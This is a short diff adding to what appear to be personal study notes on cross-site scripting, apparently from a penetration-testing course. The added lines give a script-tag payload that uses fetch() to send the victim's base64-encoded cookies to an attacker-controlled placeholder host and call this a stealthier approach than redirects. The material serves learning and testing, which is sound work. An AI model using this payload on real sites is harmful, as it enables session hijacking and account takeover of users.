@@ -362,3 +362,11 @@ keep in mind this is the base64 encoded version
 we don't always have to use the `window.location()` object that causes the victim to get redirected, we can use `fetch()` which can get data like cookies and send it to our server without redirects   
 this is stealthier 
 
+an example of this can be: 
+
+```javascript
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
+
+remember that in these attacks even if the app was using SSL encryption the attacker would still be able to capture the cookies because they are client-side 
+
